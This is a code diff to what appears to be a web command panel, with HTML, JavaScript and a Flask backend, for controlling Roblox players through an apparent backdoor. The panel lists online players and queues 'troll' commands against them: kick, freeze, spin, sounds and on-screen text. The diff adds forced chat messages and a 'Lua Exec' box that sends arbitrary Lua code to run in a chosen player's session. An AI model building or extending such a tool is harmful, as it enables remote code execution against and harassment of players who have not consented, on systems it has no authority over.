@@ -101,7 +101,7 @@ h1{font-family:Orbitron;font-size:3rem;color:#00ffaa;text-shadow:0 0 30px #00ffa
 .tab-content::-webkit-scrollbar-track{background:rgba(0,0,0,0.3);border-radius:10px}
 .tab-content::-webkit-scrollbar-thumb{background:linear-gradient(45deg,#00ffaa,#00aa88);border-radius:10px}
 .tab-content::-webkit-scrollbar-thumb:hover{background:linear-gradient(45deg,#00ffcc,#00ccaa)}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:15px}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:15px}
 .card{background:rgba(20,20,20,.9);border-radius:18px;padding:20px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
 .card:hover{transform:translateY(-8px)}
 .status{display:flex;align-items:center;gap:10px;margin-bottom:12px}
@@ -193,6 +193,28 @@ button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform
     </div>
 </div>
 
+<div class="modal" id="sendMessageModal">
+    <div class="modal-content" style="border-left:5px solid #ffaa00; box-shadow:0 0 40px rgba(255,170,0,0.7);">
+        <h2 style="color:#ffaa00;">Send Chat Message</h2>
+        <input type="text" id="chatMessage" placeholder="Enter message to send" autofocus>
+        <div class="modal-buttons">
+            <button class="cancel-btn" id="cancelMessage">Cancel</button>
+            <button class="confirm-btn" id="confirmMessage" style="background:linear-gradient(45deg,#ffaa00,#ff8800);">Send</button>
+        </div>
+    </div>
+</div>
+
+<div class="modal" id="luaExecModal">
+    <div class="modal-content" style="border-left:5px solid #ff00ff; box-shadow:0 0 40px rgba(255,0,255,0.7);">
+        <h2 style="color:#ff00ff;">Execute Lua Script</h2>
+        <textarea id="luaScript" placeholder="Enter Lua code to execute" style="width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;font-size:1rem;margin-bottom:20px;min-height:150px;font-family:monospace;resize:vertical;"></textarea>
+        <div class="modal-buttons">
+            <button class="cancel-btn" id="cancelLua">Cancel</button>
+            <button class="confirm-btn" id="confirmLua" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);">Execute</button>
+        </div>
+    </div>
+</div>
+
 <div class="toast-container" id="toasts"></div>
 
 <script>
@@ -257,11 +279,45 @@ function performTextScreen() {
     closeTextModal();
 }
 
+const sendMessageModal = document.getElementById("sendMessageModal");
+let currentMessageId = null;
+function openSendMessageModal(id) {
+    currentMessageId = id;
+    sendMessageModal.classList.add("active");
+    document.getElementById("chatMessage").focus();
+}
+function closeMessageModal() { sendMessageModal.classList.remove("active"); }
+function performSendMessage() {
+    if (!currentMessageId) return;
+    const message = document.getElementById("chatMessage").value.trim();
+    if(!message) return toast("Enter a message to send", "danger");
+    sendTroll(currentMessageId, "sendmessage", message);
+    closeMessageModal();
+}
+
+const luaExecModal = document.getElementById("luaExecModal");
+let currentLuaId = null;
+function openLuaExecModal(id) {
+    currentLuaId = id;
+    luaExecModal.classList.add("active");
+    document.getElementById("luaScript").focus();
+}
+function closeLuaModal() { luaExecModal.classList.remove("active"); }
+function performLuaExec() {
+    if (!currentLuaId) return;
+    const script = document.getElementById("luaScript").value.trim();
+    if(!script) return toast("Enter Lua code to execute", "danger");
+    sendTroll(currentLuaId, "luaexec", script);
+    closeLuaModal();
+}
+
 function sendTroll(id, cmd, param = null) {
     const body = {userid: id, cmd: cmd};
     if(param) {
         if(cmd === "playsound") body["assetId"] = param;
         else if(cmd === "textscreen") body["text"] = param;
+        else if(cmd === "sendmessage") body["message"] = param;
+        else if(cmd === "luaexec") body["script"] = param;
     }
     fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(body)});
     toast(`${cmd.toUpperCase()} sent`, "danger");
@@ -279,6 +335,14 @@ document.getElementById("cancelText").onclick = closeTextModal;
 document.getElementById("confirmText").onclick = performTextScreen;
 textScreenModal.onclick = (e) => { if (e.target === textScreenModal) closeTextModal(); };
 
+document.getElementById("cancelMessage").onclick = closeMessageModal;
+document.getElementById("confirmMessage").onclick = performSendMessage;
+sendMessageModal.onclick = (e) => { if (e.target === sendMessageModal) closeMessageModal(); };
+
+document.getElementById("cancelLua").onclick = closeLuaModal;
+document.getElementById("confirmLua").onclick = performLuaExec;
+luaExecModal.onclick = (e) => { if (e.target === luaExecModal) closeLuaModal(); };
+
 function render(data) {
     document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
     const grid = document.getElementById("players");
@@ -295,7 +359,7 @@ function render(data) {
             Game: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.game}</a><br>
             JobId: ${p.jobId}</div>
             <div class="category">TROLLS</div>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
+            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;">
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll('${id}','spin')">SPIN</button>
@@ -305,10 +369,11 @@ function render(data) {
                 <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                 <button class="kick-btn" style="background:orange;" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
                 <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#ffffff,#cccccc);color:#000;" onclick="sendTroll('${id}','flashbang')">FLASHBANG</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ffaa00,#ff8800);" onclick="openSendMessageModal('${id}')">SEND MESSAGE</button>
+                <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="openLuaExecModal('${id}')">LUA EXEC</button>
             </div>
             <div class="category">UNDO</div>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
+            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;">
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                 <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
@@ -397,6 +462,10 @@ def api():
                     result["assetId"] = cmd["assetId"]
                 if "text" in cmd:
                     result["text"] = cmd["text"]
+                if "message" in cmd:
+                    result["message"] = cmd["message"]
+                if "script" in cmd:
+                    result["script"] = cmd["script"]
             return jsonify(result)
         return jsonify({})
 
@@ -428,6 +497,12 @@ def troll():
         elif "text" in data:
             cmd_data["text"] = data["text"]
             details += f" (Text: {data['text']})"
+        elif "message" in data:
+            cmd_data["message"] = data["message"]
+            details += f" (Message: {data['message']})"
+        elif "script" in data:
+            cmd_data["script"] = data["script"]
+            details += f" (Script: {data['script'][:50]}...)"
         
         pending_commands[uid] = cmd_data
         name = connected_players.get(uid, {}).get("username", "Unknown")
